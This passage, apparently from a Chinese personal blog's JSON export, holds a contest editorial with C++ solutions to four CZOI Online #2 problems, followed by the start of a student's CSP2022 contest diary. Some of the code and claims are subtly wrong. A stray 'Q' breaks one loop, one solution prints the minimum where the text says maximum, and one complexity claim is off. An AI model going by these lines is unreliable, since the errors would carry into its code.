f=-1;\n\t\tch=getchar();\n\t}\n\twhile(isdigit(ch)){\n\t\tres=(res<<3)+(res<<1)+(ch-'0');\n\t\tch=getchar();\n\t}\n\treturn res*f;\n}\n\nstringstream black;\nbool flag=false;\ninline void add(int x){\n\t///cout<<\"add\"<<x<<endl;\n\tif(x==0&&!flag) return;\n\tflag=true;\n\tblack<<x;\n}\n\nint a[1003],_time;\ntypedef pair<int,int> pii;\nvector<pii> ve;\nint main(){\n\tint n=read();\n\tfor(int i=1;i<=n;i++) a[i]=read();\n\tint q=read();\n\tint p=1;\n\tstring str;\n\tcin>>str;\n\n\tfor(int i=0;i<str.size();i++){\n\t\tchar opt=str[i];\n\t\tif(opt=='1'){\n\t\t\tve.push_back(pii(++_time,a[p]));\n\t\t\tp++;\n\t\t\tif(p>n) p-=n;\n\t\t}\n\t\tif(opt=='2'){\n\t\t\tsort(ve.begin(),ve.end(),[](pii x,pii y){\n\t\t\t\treturn x.first<y.first;\n\t\t\t});\n\t\t\tadd(ve[0].second);\n\t\t\tve.erase(ve.begin());\n\t\t}\n\t\tif(opt=='3'){\n\t\t\tsort(ve.begin(),ve.end(),[](pii x,pii y){\n\t\t\t\treturn x.first>y.first;\n\t\t\t});\n\t\t\tadd(ve[0].second);\n\t\t\tve.erase(ve.begin());\n\t\t}\n\t\tif(opt=='4'){\n\t\t\tif(!flag){\n\t\t\t\tcout<<'0'<<endl;\n\t\t\t}else{\n\t\t\t\tcout<<black.str()<<endl;\n\t\t\t\tflag=false;\n\t\t\t\tblack.str(\"\");\n\t\t\t}\n\t\t}\n\t}\n\treturn 0;\n}\n```\n\n时间复杂度 $O(q_1+q_4+(q_2+q_3)\\times q_1 \\log q_1)$ 可认为时间复杂度为 $O(q^2\\log q)$\n\n期望得分 60pts。\n\n### 算法二\n\n对于测试点#13-#14的只有操作2的特殊性质，我们不难想到拥有“先进先出”性质的数据结构：队列。\n\n然后我们进一步思考测试点#15-#16的特殊性质，不难发现可以用一个栈来处理“先进后出”。\n\n这样，我们对于这两个特殊性质进行专门的处理。\n\n```cpp\n#include<bits/stdc++.h>\nusing namespace std;\n\ninline int read(){\n\tint res=0,ch=getchar(),f=1;\n\twhile(!isdigit(ch) and ch!=EOF){\n\t\tif(ch=='-') f=-1;\n\t\tch=getchar();\n\t}\n\twhile(isdigit(ch)){\n\t\tres=(res<<3)+(res<<1)+(ch-'0');\n\t\tch=getchar();\n\t}\n\treturn res*f;\n}\n\nstringstream black;\nbool flag=false;\ninline void add(int x){\n\t///cout<<\"add\"<<x<<endl;\n\tif(x==0&&!flag) return;\n\tflag=true;\n\tblack<<x;\n}\n\nint a[1003],_time,n;\ntypedef pair<int,int> pii;\nvector<pii> ve;\nstring str;\nint p=1;\nvoid subtask1(){\n\tfor(int i=0;i<str.size();i++){\n\t\tchar opt=str[i];\n\t\tif(opt=='1'){\n\t\t\tve.push_back(pii(++_time,a[p]));\n\t\t\tp++;\n\t\t\tif(p>n) p-=n;\n\t\t}\n\t\tif(opt=='2'){\n\t\t\tsort(ve.begin(),ve.end(),[](pii x,pii y){\n\t\t\t\treturn x.first<y.first;\n\t\t\t});\n\t\t\tadd(ve[0].second);\n\t\t\tve.erase(ve.begin());\n\t\t}\n\t\tif(opt=='3'){\n\t\t\tsort(ve.begin(),ve.end(),[](pii x,pii y){\n\t\t\t\treturn x.first>y.first;\n\t\t\t});\n\t\t\tadd(ve[0].second);\n\t\t\tve.erase(ve.begin());\n\t\t}\n\t\tif(opt=='4'){\n\t\t\tif(!flag){\n\t\t\t\tcout<<'0'<<endl;\n\t\t\t}else{\n\t\t\t\tcout<<black.str()<<endl;\n\t\t\t\tflag=false;\n\t\t\t\tblack.str(\"\");\n\t\t\t}\n\t\t}\n\t}\n}\n\nqueue<int> que;\nvoid subtask2(){\n\tfor(int i=0;i<str.size();i++){\n\t\tchar opt=str[i];\n\t\tif(opt=='1'){\n\t\t\tque.push(a[p]);\n\t\t\tp++;\n\t\t\tif(p>n) p-=n;\n\t\t}\n\t\tif(opt=='2'){\n\t\t\tadd(que.front());\n\t\t\tque.pop();\n\t\t}\n\t\tif(opt=='4'){\n\t\t\tif(!flag){\n\t\t\t\tcout<<'0'<<endl;\n\t\t\t}else{\n\t\t\t\tcout<<black.str()<<endl;\n\t\t\t\tflag=false;\n\t\t\t\tblack.str(\"\");\n\t\t\t}\n\t\t}\n\t}\n}\n\nstack<int> sta;\nvoid subtask3(){\n\tfor(int i=0;i<str.size();i++){\n\t\tchar opt=str[i];\n\t\tif(opt=='1'){\n\t\t\tsta.push(a[p]);\n\t\t\tp++;\n\t\t\tif(p>n) p-=n;\n\t\t}\n\t\tif(opt=='3'){\n\t\t\tadd(sta.top());\n\t\t\tsta.pop();\n\t\t}\n\t\tif(opt=='4'){\n\t\t\tif(!flag){\n\t\t\t\tcout<<'0'<<endl;\n\t\t\t}else{\n\t\t\t\tcout<<black.str()<<endl;\n\t\t\t\tflag=false;\n\t\t\t\tblack.str(\"\");\n\t\t\t}\n\t\t}\n\t}\n}\nvoid subtask0(){\n\tfor(int i=0;i<str.size();i++){\n\t\tchar opt=str[i];\n\t\tif(opt=='4') cout<<'0'<<endl;\n\t}\n}\n\nint main(){\n\tn=read();\n\tfor(int i=1;i<=n;i++) a[i]=read();\n\tint q=read();\n\tcin>>str;\n\tint q2=0,q3=0;\n\tfor(int i=0;i<str.size();i++){\n\t\tif(str[i]=='2') q2++;\n\t\tif(str[i]=='3') q3++;\n\t}\n\tif(q2==0&&q3==0) subtask0();\n\tif(q2!=0&&q3!=0) subtask1();\n\telse if(q2!=0) subtask2();\n\telse if(q3!=0) subtask3();\n\treturn 0;\n}\n```\n\n时间复杂度同算法一。期望得分80pts。\n\n### 算法三\n\n我们把栈和队列结合在一起看，发现加入最早的数相当于把序列中最头上的数加入。加入最晚的数相当于把序列中最末尾的数加入。这样的操作使我们想到了双向队列，这样就得到了本题的标准算法。\n\n```cpp\n#include<iostream>\n#include<deque>\n#include<cstdio>\n#include<sstream>\nusing namespace std;\n\ninline int read(){\n\tint res=0,ch=getchar(),f=1;\n\twhile(!isdigit(ch) and ch!=EOF){\n\t\tif(ch=='-') f=-1;\n\t\tch=getchar();\n\t}\n\twhile(isdigit(ch)){\n\t\tres=(res<<3)+(res<<1)+(ch-'0');\n\t\tch=getchar();\n\t}\n\treturn res*f;\n}\n\nstringstream black;\nbool flag=false;\ninline void add(int x){\n\t///cout<<\"add\"<<x<<endl;\n\tif(x==0&&!flag) return;\n\tflag=true;\n\tblack<<x;\n}\n\nint a[1003];\nint main(){\n\tint n=read();\n\tfor(int i=1;i<=n;i++) a[i]=read();\n\tint q=read();\n\tint p=1;\n\tstring str;\n\tcin>>str;\n\n\tdeque<int> deq;\n\tfor(int i=0;i<str.size();i++){\n\t\tchar opt=str[i];\n\t\tif(opt=='1'){\n\t\t\tdeq.push_back(a[p]);\n\t\t\tp++;\n\t\t\tif(p-1>=n) p-=n;\n\t\t}\n\t\tif(opt=='2'){\n\t\t\tadd(deq.front());\n\t\t\tdeq.pop_front();\n\t\t}\n\t\tif(opt=='3'){\n\t\t\tadd(deq.back());\n\t\t\tdeq.pop_back();\n\t\t}\n\t\tif(opt=='4'){\n\t\t\tif(!flag){\n\t\t\t\tcout<<'0'<<endl;\n\t\t\t}else{\n\t\t\t\tcout<<black.str()<<endl;\n\t\t\t\tflag=false;\n\t\t\t\tblack.str(\"\");\n\t\t\t}\n\t\t}\n\t}\n\treturn 0;\n}\n```\n\n时间复杂度 $O(q)$，期望得分100pts。\n\n## T2 序列\n\n### 算法一\n\n暴力修改。对于所有 $k=1$ 的情况，最后扫描一下序列，找到最大值。\n\n```cpp\n#include<iostream>\nusing namespace std;\n\nint n,m,k;\nint A,B,C,P;\ninline int rnd(){return A=(A*B+C)%P;};\ninline int get(){return rnd()%n+1;};\n\nint a[10000007];\nint main(){\n\tcin>>n>>m>>k;\n\tcin>>A>>B>>C>>P;\n\tfor(int i=1;i<=n;i++) a[i]=get();\n\tint ans=0;\n\tfor(int i=1;i<=m;i++){\n\t\tint f=get(),g=get(),t=get();\n\t\tif(f>g) swap(f,g);\n\t\tfor(int j=f;j<=g;j++){\n\t\t\ta[j]+=t;\n\t\t}\n\t}\n\tfor(int i=1;i<=n;i++){\n\t\tans=max(ans,a[i]);\n\t}\n\tcout<<ans;\n\treturn 0;\n}\n```\n\n时间复杂度 $O(nm)$\n\n期望得分12pts，由于测试点#7过水，实际得分15pts\n\n### 算法二\n\n我们学习过排序算法。对于其他k的情况，可以通过排序解决\n\n```cpp\n#include<iostream>\n#include<algorithm>\n#define int long long\nusing namespace std;\n\nint n,m,k;\nint A,B,C,P;\ninline int rnd(){return A=(A*B+C)%P;};\ninline int get(){return rnd()%n+1;};\n\nint a[10000007];\nsigned main(){\n\tcin>>n>>m>>k;\n\tcin>>A>>B>>C>>P;\n\tfor(int i=1;i<=n;i++) a[i]=get();\n\tfor(int i=1;i<=m;i++){\n\t\tint f=get(),g=get(),t=get();\n\t\tif(f>g) swap(f,g);\n\t\tfor(int j=f;j<=g;j++){\n\t\t\ta[j]+=t;\n\t\t}\n\t}\n\tsort(a+1,a+n+1,[](int a,int b){\n\t\treturn a>b;\n\t});\n\tcout<<a[k];\n\treturn 0;\n}\n```\n\n时间复杂度 $O(mn+nlogn)$\n\n期望得分23pts\n\n实际上，对于测试点#10，我们并不需要再去排序了，直接扫描一遍序列就可以取出最大值了。期望得分28pts\n\n### 算法三\n\n发现k非常小，取值范围只有1,2,3。我们可以设三个变量，遇到一个数，先尝试更新最大值。比最大值小尝试更新第二大的值。比第二大的值小尝试更新第三大的值。\n\n```cpp\n#include<iostream>\n#include<algorithm>\n#define int long long\nusing namespace std;\n\nint n,m,k;\nint A,B,C,P;\ninline int rnd(){return A=(A*B+C)%P;};\ninline int get(){return rnd()%n+1;};\n\nint a[10000007];\nsigned main(){\n\tcin>>n>>m>>k;\n\tcin>>A>>B>>C>>P;\n\tfor(int i=1;i<=n;i++) a[i]=get();\n\tfor(int i=1;i<=m;i++){\n\t\tint f=get(),g=get(),t=get();\n\t\tif(f>g) swap(f,g);\n\t\tfor(int j=f;j<=Q\tg;j++){\n\t\t\ta[j]+=t;\n\t\t}\n\t}\n\n\tint m1=0,m2=0,m3=0;\n\tfor(int i=1;i<=n;i++){\n\t\tif(a[i]>=m1){\n\t\t\tm3=m2;\n\t\t\tm2=m1;\n\t\t\tm1=a[i];\n\t\t}else if(a[i]>=m2){\n\t\t\tm3=m2;\n\t\t\tm2=a[i];\n\t\t}else if(a[i]>=m3){\n\t\t\tm3=a[i];\n\t\t}\n\t}\n\tif(k==1) cout<<m1;\n\tif(k==2) cout<<m2;\n\tif(k==3) cout<<m3;\n\treturn 0;\n}\n```\n\n时间复杂度 $O(mn+n)$\n\n期望得分55pts\n\n### 算法四\n\n我们已经把最后找第k大的数的过程的时间复杂度降到最低，但还是无法通过，主要是区间修改操作耗费了大量时间，我们需要优化\n\n观察到，最后求第k大的数，是在所有操作之后进行的，这是一个特殊的地方。数据范围为 $1e7$ 启示我们用 $O(1)$ 的修改算法\n\n这就需要差分了\n\n设差分数组 $d[i]=a[i]-a[i-1]$\n\n对于给区间 $[l,r]$ 加上 $d$，可变为修改差分数组：$d[l]+=d,d[r+1]-=d$\n\n对差分数组求前缀和就可以得到对应位置修改操作之后的值\n\n```cpp\n#include<iostream>\n#include<cstdio>\n#define int long long\nusing namespace std;\n\ninline int read(){\n\tint res=0,ch=getchar(),f=1;\n\twhile(!isdigit(ch) and ch!=EOF){\n\t\tif(ch=='-') f=-1;\n\t\tch=getchar();\n\t}\n\twhile(isdigit(ch)){\n\t\tres=(res<<3)+(res<<1)+(ch-'0');\n\t\tch=getchar();\n\t}\n\treturn res*f;\n}\n\nint A,B,C,P;\nint n,m,k;\ninline int rnd(){return A=(A*B+C)%P;};\ninline int get(){return rnd()%n+1;};\n\nint a[10000007];\nint d[10000007];\n\nsigned main(){\n\t//freopen(\"a.in\",\"r\",stdin);\n\t//freopen(\"a.out\",\"w\",stdout);\n\tn=read(),m=read(),k=read();\n\tA=read(),B=read(),C=read(),P=read();\n\tfor(int i=1;i<=n;i++){\n\t\ta[i]=get();\n\t\td[i]=a[i]-a[i-1];\n\t}\n\tfor(int i=1;i<=m;i++){\n\t\tint l=get(),r=get(),t=get();\n\t\tif(l>r) swap(l,r);\n\t\td[l]+=t;\n\t\td[r+1]-=t;\n\t}\n\tint sum=0;\n\tfor(int i=1;i<=n;i++){\n\t\tsum+=d[i];\n\t\ta[i]=sum;\n\t}\n\n\tint m1=0,m2=0,m3=0;\n\tfor(int i=1;i<=n;i++){\n\t\tif(a[i]>=m1){\n\t\t\tm3=m2;\n\t\t\tm2=m1;\n\t\t\tm1=a[i];\n\t\t}else if(a[i]>=m2){\n\t\t\tm3=m2;\n\t\t\tm2=a[i];\n\t\t}else if(a[i]>=m3){\n\t\t\tm3=a[i];\n\t\t}\n\t}\n\n\tif(k==1) cout<<m1;\n\tif(k==2) cout<<m2;\n\tif(k==3) cout<<m3;\n\treturn 0;\n}\n```\n\n时间复杂度 $O(m+n)$\n\n期望得分100pts\n\n## T3 滚动\n\n### 算法一\n\n直接朴素暴力\n\n```cpp\n#include<bits/stdc++.h>\n#define int long long\n#define _ 1000006\nusing namespace std;\nconst int mod=0;\n\ninline int read(){\n\tint res=0,ch=getchar(),f=1;\n\twhile(!isdigit(ch) and ch!=EOF){\n\t\tif(ch=='-') f=-1;\n\t\tch=getchar();\n\t}\n\twhile(isdigit(ch)){\n\t\tres=(res<<3)+(res<<1)+(ch-'0');\n\t\tch=getchar();\n\t}\n\treturn res*f;\n}\n\nint a[_],n,m;\n\nsigned main(){\n\tn=read(),m=read();\n\tfor(int i=1;i<=n;i++) a[i]=read();\n\n\twhile(m--){\n\t\tint x=read();cout<<a[x]<<endl;\n\t\tint t=a[x];\n\t\tfor(int i=x;i<n;i++) a[i]=a[i+1];\n\t\ta[n]=t;\n\t}\n\treturn 0;\n}\n```\n\n时间复杂度：$O(mn)$，期望得分30pts。\n\n### 算法二\n\n为了方便表述，我们设所有的x等于X\n\n考虑具有特殊性质的测试点，仔细推导规律，不难发现，我们可以不滚动序列，而是类似第一题一样，定义一个指针p，一开始将指针p指向位置X。每次操作时输出指针指向的数，然后将指针右移，如果指针指向位置超过了n，那么就将指针重新指向位置X。\n\n```cpp\n#include<bits/stdc++.h>\n#define int long long\n#define _ 1000006\nusing namespace std;\nconst int mod=0;\n\ninline int read(){\n\tint res=0,ch=getchar(),f=1;\n\twhile(!isdigit(ch) and ch!=EOF){\n\t\tif(ch=='-') f=-1;\n\t\tch=getchar();\n\t}\n\twhile(isdigit(ch)){\n\t\tres=(res<<3)+(res<<1)+(ch-'0');\n\t\tch=getchar();\n\t}\n\treturn res*f;\n}\n\nint a[_],n,m;\nvector<int> ve;\nvoid subtask2(){\n\tfor(int i=0;i<m;i++){\n\t\tint x=ve[i];cout<<a[x]<<endl;\n\t\tint t=a[x];\n\t\tfor(int i=x;i<n;i++) a[i]=a[i+1];\n\t\ta[n]=t;\n\t}\n}\nvoid subtask1(){\n\tint p=ve[0];\n\twhile(m--){\n\t\tcout<<a[p]<<endl;\n\t\tp++;\n\t\tif(p>n) p=ve[0];\n\t}\n}\n\nsigned main(){\n\tn=read(),m=read();\n\tfor(int i=1;i<=n;i++) a[i]=read();\n\n\tbool flag=true;\n\tint t;\n\tfor(int i=1;i<=m;i++){\n\t\tt=read();\n\t\tif(i!=1){\n\t\t\tif(t!=ve[0]) flag=false;\n\t\t}\n\t\tve.push_back(t);\n\t}\n\tif(flag) subtask1();\n\telse subtask2();\n\treturn 0;\n}\n```\n\n时间复杂度：$O(mn)$，期望得分70pts。\n\n### 算法三\n\n我们考虑将整个序列分为若干个块。每个块的大小为 $\\sqrt{n}$，则一共有 $\\sqrt{n}$ 个块，我们将每个块进行标号。特别地，最后一个块的编号为 $end$。\n\n我们再重新考虑数列的滚动。我们可以将题意转化为：将要查询的位置的数输出，然后把这个数放到序列的末尾，然后序列后面的数集体向前移动来补齐空位。\n\n我们将每个块用vector来储存。把每个数放到其所属的块内。\n\n这样对于滚动这一操作，我们可以把查询到的数从其原本的块内删除，再将其加入块 $end$ 中。\n\n这样一来，滚动操作的复杂度被我们降为 $O(1)$。但这样进行若干次操作之后，每个块内的数的数量不是相同的，我们查询一个数，只能遍历每个块，找到要查询的数，这样的复杂度是 $O(n)$ 的。\n\n但我们进一步考虑，我们无需一个数一个数遍历，由于我们已经分块，我们可以一个块一个块的去跳过，这样一来，查询操作的复杂度被降低为 $O(\\sqrt{n})$ 。\n\n但我们需要进一步考虑，当进行若干次操作后，可能$end$ 块之前的所有块内已经没有了数字，所有的数字都已经被放到了 $end$ 块中。这样一来，查询操作的复杂度退化为 $O(n)$\n\n为此，我们需要定期将整个序列重新分块，来降低复杂度。我们选择每执行 $\\sqrt{n}$ 次操作后重建分块。\n\n```cpp\n#include<bits/stdc++.h>\n#define int long long\n#define _ 1000006\nusing namespace std;\nconst int mod=0;\n\ninline int read(){\n\tint res=0,ch=getchar(),f=1;\n\twhile(!isdigit(ch) and ch!=EOF){\n\t\tif(ch=='-') f=-1;\n\t\tch=getchar();\n\t}\n\twhile(isdigit(ch)){\n\t\tres=(res<<3)+(res<<1)+(ch-'0');\n\t\tch=getchar();\n\t}\n\treturn res*f;\n}\n\nint a[_],n,m;\nint blo,bl[_],tmp[_],cnt;\nvector<int> ve[_];\n\nsigned main(){\n\tn=read(),m=read();\n\tfor(int i=1;i<=n;i++) a[i]=read();\n\n\tblo=sqrt(n);\n\tfor(int i=1;i<=n;i++) bl[i]=(i-1)/blo+1;\n\tfor(int i=1;i<=n;i++) ve[bl[i]].push_back(a[i]);\n\n\twhile(m--){\n\t\tint x=read(),p=1,t;\n\t\twhile(x>ve[p].size()) x-=ve[p].size(),p++;\n\t\tt=ve[p][x-1];cout<<t<<endl;\n\t\tauto ii=ve[p].begin();\n\t\tfor(int i=1;i<x;i++) ii++;\n\t\tve[p].erase(ii);\n\t\tve[(n-1)/blo+1].push_back(t);\n\t\tcnt++;\n\t\tif(cnt==blo){\n\t\t\tint pp=0;\n\t\t\tfor(int i=1;i<=(n-1)/blo+1;i++){\n\t\t\t\tfor(int e:ve[i])\n\t\t\t\t\ttmp[++pp]=e;\n\t\t\t\tve[i].clear();\n\t\t\t}\n\t\t\t//for(int i=1;i<=tot;i++) cout<<a[i]<<' ';\n\t\t\t//cout<<endl;\n\t\t\tfor(int i=1;i<=pp;i++) ve[bl[i]].push_back(tmp[i]);\n\t\t\tcnt=0;\n\t\t}\n\t\t//cout<<endl;\n\t\t//for(int i=1;i<=(n-1)/blo+1;i++){\n\t\t//\tfor(int e:ve[i]) cout<<e<<' ';\n\t\t//}\n\t\t//cout<<endl;\n\t}\n\treturn 0;\n}\n```\n\n时间复杂度 $O(n\\sqrt{n})$。期望得分100pts。\n\n## T4 南瓜\n\n### 算法一\n\n我们首先考虑特殊性质A，我们对于每个南瓜将其圆度算出，并与1作差取绝对值，然后输出最大的即可。\n\n```cpp\n#include<bits/stdc++.h>\n#define _ 1000006\nusing namespace std;\n\ndouble h[_],d[_],n,k;\nint main(){\n\tcin>>n,cin>>k;\n\tfor(int i=1;i<=n;i++) cin>>h[i];\n\tfor(int i=1;i<=n;i++) cin>>d[i];\n\tvector<double> ve;\n\tfor(int i=1;i<=n;i++){\n\t\tve.push_back(fabs(1.0-h[i]/d[i]));\n\t}\n\tsort(ve.begin(),ve.end());\n\tprintf(\"%.4lf\",ve[0]);\n\treturn 0;\n}\n```\n\n时间复杂度 $O(n\\log n)$ 期望得分35pts。\n\n### 算法二\n\n继续考虑特殊性质B，我们只需要把所有的 $h$ 和 $d$，分别加起来再作商即可。\n\n```cpp\n#include<bits/stdc++.h>\n#define _ 1000006\nusing namespace std;\n\ndouble h[_],d[_],n,k;\nint main(){\n\tcin>>n,cin>>k;\n\tdouble suma=0,sumb=0,ans;\n\tfor(int i=1;i<=n;i++) cin>>h[i],suma+=h[i];\n\tfor(int i=1;i<=n;i++) cin>>d[i],sumb+=d[i];\n\tans=suma/sumb;\n\tprintf(\"%.4lf\",ans);\n\treturn 0;\n}\n```\n\n时间复杂度 $O(n)$ ，结合算法一期望得分60pts。\n\n### 算法三\n\n对于前四个测试点，我们注意到数据规模非常小，我们考虑使用暴力搜索\n\n```cpp\n#include<bits/stdc++.h>\n#define _ 1000006\nusing namespace std;\n\ndouble h[_],d[_],n,k;\n\ndouble ans;\nvoid dfs(int a,int b,double suma,double sumb){\n\tif(b==k){\n\t\tans=max(ans,suma/sumb);\n\t\treturn;\n\t}\n\tif(a>n) return;\n\tdfs(a+1,b+1,suma+h[a],sumb+d[a]);\n\tdfs(a+1,b,suma,sumb);\n}\n\nint main(){\n\tcin>>n,cin>>k;\n\tfor(int i=1;i<=n;i++) cin>>h[i];\n\tfor(int i=1;i<=n;i++) cin>>d[i];\n\tdfs(1,0,0,0);\n\tprintf(\"%.4lf\",ans);\n\treturn 0;\n}\n```\n\n时间复杂度 $O(C_n^k)$。结合算法一、二，期望得分80pts。\n\n### 算法四\n\n分类讨论，对于 $k=1$ 的情况，直接按照算法一的方式去写即可。\n\n对于其他情况，我们考虑二分答案。我们在 $[0,10^{12}]$ 的范围内进行二分。 对于二分到的 mid，我们对其进行check，判断是否可以满足选出 $k$ 个南瓜，这些南瓜的；平均圆度大于 mid。\n\ncheck 函数的实现成为了现在问题的关键。现在要满足：\n\n$$\\frac{\\sum h_i}{\\sum d_i}\\ge mid$$\n\n移项，得到\n\n$$\\sum{(h_i-mid\\times d_i)}\\ge 0$$\n\n我们可以这样说，每个南瓜的贡献为 $h_i-mid\\times d_i$，我们要找k的南瓜，使得这k个南瓜的贡献加起来大于等于0。\n\n显然，我们将所有南瓜的贡献算出来，从大到小排序，选择前k大的贡献加起来，如果总贡献大于等于0说明这个mid是可以接受的，反之不可以接受。\n\n```cpp\n#include<bits/stdc++.h>\n#define _ 1000006\nusing namespace std;\n\ndouble h[_],d[_],n,k;\n\nbool check(double mid){\n\tdouble ok=0;\n\tvector<double> ve;\n\tfor(int i=1;i<=n;i++) ve.push_back(h[i]-d[i]*mid);\n\tsort(ve.begin(),ve.end(),[](double x,double y){return x>y;});\n\tfor(int i=0;i<k;i++) ok+=ve[i];\n\treturn ok>=0;\n}\n\nvoid subtask2(){\n\tdouble l=0,r=1000000000000,mid,ans;\n\twhile(r-l>=1e-8){\n\t\tmid=(l+r)/2;\n\t\tif(check(mid)) ans=mid,l=mid;\n\t\telse r=mid;\n\t}\n\tprintf(\"%.4lf\",ans);\n}\nvoid subtask1(){\n\tvector<double> ve;\n\tfor(int i=1;i<=n;i++){\n\t\tve.push_back(fabs(1.0-h[i]/d[i]));\n\t}\n\tsort(ve.begin(),ve.end());\n\tprintf(\"%.4lf\",ve[0]);\n}\n\nint main(){\n\tcin>>n,cin>>k;\n\tfor(int i=1;i<=n;i++) cin>>h[i];\n\tfor(int i=1;i<=n;i++) cin>>d[i];\n\tif(k==1) subtask1();\n\telse subtask2();\n\treturn 0;\n}\n```\n\n时间复杂度 $O(n \\log \\log n)$ 。期望得分100pts。\n\n","summary":"本篇文章是举行在2022年12月16日的 CZOI Online #2 的题解","key":["czoi"],"tags":[],"path":["算法竞赛","CZOI","CZOI Online #2 题解.md"],"background":"https://pic.caiwen.work/i/2025/01/22/67909e51b8f1c.jpg","recommend":false,"status":"published"},{"type":"Article","title":"高二oier退役记&CSP2022-S2游记","id":"noip-finnal","createTime":"2022-11-24T18:06:00.000Z","updateTime":"2025-09-05T13:34:04.913Z","content":"\n## 2022-10-20\n\n得到官网通知，CSP今年改成去石家庄考了。比赛之前需要到石家庄的酒店隔离七天。中午从机房填写了两张承诺书，在小程序上报备，准备第二天中午吃完午饭到校门口集合，准备出发。\n\n## 2022-10-21\n\n上午的课基本上没心思听了，划水划过去了。很快到中午，吃完饭和朋友道别，就从校门口等着人都来齐。然后坐上了大巴车，从学校离开。\n\n没想到从此开始了一个多月的艰难历程...\n\n坐在大巴车上，感到非常无聊，还有点晕车。一会就睡着了。中间在服务区听了一下，下车换了一下空气，紧接着就继续行进。大约2个多小时车程，终于进入石家庄境内。对石家庄的第一印象就是感觉不像一个省会，也没有看出很发达的样子，感觉跟个二三线的小城市一样。\n\n![](https://www.caiwen.work/wp-content/uploads/2022/11/QQ图片20221124233622.jpg)\n\n又过了十几分钟，来到了酒店门口。下车给了房卡，就上楼进房间了。刚开始到房间里感觉空间蛮小的，并且不相信自己会在这个屋里一直隔离7天。接下来就在房间里继续练题。\n\n## 2022-10-22~28\n\n开始了漫长的隔离...\n\n每天都有模拟赛，但不知道是题目的原因还是自身原因，这几次模拟赛的分数逐步走低，之前可以打到200分，现在只能100出头，甚至不到100。\n\n自己之前就有个习惯，总是想把每次模拟赛的四道题全部改对，因为感觉只有这样才这题做透了这套题。不过视频讲解很让人费解，有时一上午只能改出一道题。然而下午就又要开始新的模拟赛。再加上之前原本的计划是要把所有的算法都要重新深化一遍，现在光是模拟赛改题就让人头大...心态逐渐不好了。\n\n七次的模拟赛，倒数第二场是tsx出的题，题目难度很大，当时测完之后，所有人都爆零了。教练当时也心态大崩，叫我们出去开会，说这几次的测试很不理想，让我们赶紧调整状态。\n\n由于倒数第二场太难了，最后一场出题人把原来的第一题换了个简单的，后面三题依次往后挪。不过正巧那场的第一题之前和同学讨论过，就写出了正解。测试的时候竟然又是全体爆零。最后才发现原来是oj上要求文件读写，但教练没看到，让我们提交的时候把文件读写删掉。加上文件读写，最后得分100多，不算高也不算低，感觉是个好的结局。\n\n快要csp的前两天，我开始练习模板。本以为最后一场模拟赛完了就没了，没想到教练又准备了一场考前信心赛。信心赛的第一题题目非常简洁，应该是很好ac的，但当时就是没想出来，后面的题目也没有很好的想法，就决定放弃了，不交了。\n\n练习模板的时候发现一些算法当时简单学了一下就没怎么练了，因此就又重新学了一遍。大多数算法都是草草过了一遍，但直到csp考试当天都没有复习完，只能心里想着csp不考没复习过的算法。\n\n当时每天都24点甚至1点多才睡觉...\n\n## 2022-10-29\n\n上午摆烂，中午12点草草食完饭就开始睡觉。睡到一半被普及组考完回来的人在楼道里大喊大叫吵醒。一看时间快13：10了。于是赶紧起床准备出发\n\n车上，周围都是衡中的，感觉心里压力上来了。头进考场前，教练让我们大声喊出学校的名字加油。几乎每个人都不愿意喊...\n\n然后急匆匆进了考场，找到座位就坐了下来，在devc++里改了下编译指令，开了下O2，又建了几个文件夹。看到周围的人都没动电脑，感觉很奇怪，于是自己也没有再继续动。等到监考老师宣布考场记录的时候才发现原来考试前不能碰电脑。心里凉了半截...可能直接爆零了...跟监考老师说了下，监考老师把窗口都关上，让我不要动了。\n\n**14：30**  \n比赛开始了。\n\n**14：30 - 15：00**  \n先把所有的题急匆匆看了一遍。第一题感觉是最短路，再加上考试重点复习了分层图最短路，第一直觉就是想拿分层图最短路做，算了下状态数感觉正好合适。然后第二题，看到博弈吓了一跳，分析样例才发现原来是第一行取一个数，然后第二行遍历一遍找到两数乘积最小值，然后取这些最小值里面的最大值。第三题貌似可以先判断个出度，然后可以用tarjan搞一下。第四题感觉没有很好的思路\n\n**15：00 - 16：00**  \n决定先开第二题。25分的暴力很快写完了，过了样例，说明我一开始的想法是正确的。然后进一步想到其实是在矩阵中每一行取一个最小值，然后再最后取最小值里面的最大值。其中每行取最小值显然可以用st表优化。但这样的复杂度显然不够的。而且1e5的数据，二维数组怎么可能存的下，到这里就没思路了。于是决定实现以下部分分，大概60分。写st表的时候发现lg的预处理和倍增求lca的搞混了，不知道选哪个。预处理时候循环的边界也拿不准。写完后很显然没有过样例，然后调了半天，怎么也发现不了错误，由于在这一题上面的时间过久，就打算直接写第一题了。\n\n**16:00 - 16:30**  \n开始做第二题，先把自己刚才想的实现了一下，发现由于要求最大值，相当于求最长路，需要用spfa。写完后不出意外样例没过，然后debug了半天，把小毛病改完后过了第一个样例。然后测第二个样例，结果又和答案对不上。眼看比赛还剩两小时，结果只有25分是稳拿的，心里慌了\n\n**16:30 - 17:00**  \n又准备换第三道题。tarjan写到一半有个地方忘了怎写了，于是先蒙了一个试了试。写完后一测样例，果然又不对，debug了半天，改来改去总是有毛病，过不去样例。眼看就剩一个半小时了，决定赶紧把前面的暴力写了\n\n**17：00 - 17：30**  \n首先迅速把第一题的暴力写好了，然后debug了一会，确保大样例都通过，就继续第二题。第二题突然发现之前的st表有个循环边界写错了，改完后发现可以过样例，然后拿大样例过来测了一下，对上了。\n\n**17:30 - 18：00**  \n于是又回到了第三题，又debug了半天。最后才发现是题目读错了，然后迅速改完，勉强过了样例，大样例不敢测，就继续第四题了\n\n**18:00 - 18:20**  \n第四题没有很好的思路，但k=1的条件显然可以直接求两点之间经过点权之和，于是打算打倍增求lca。打到一半发现循环边界忘了，于是立刻改成写树链剖分求lca。然后手造了组数据，一测对了，于是就停写了\n\n**18:20 - 18:30**  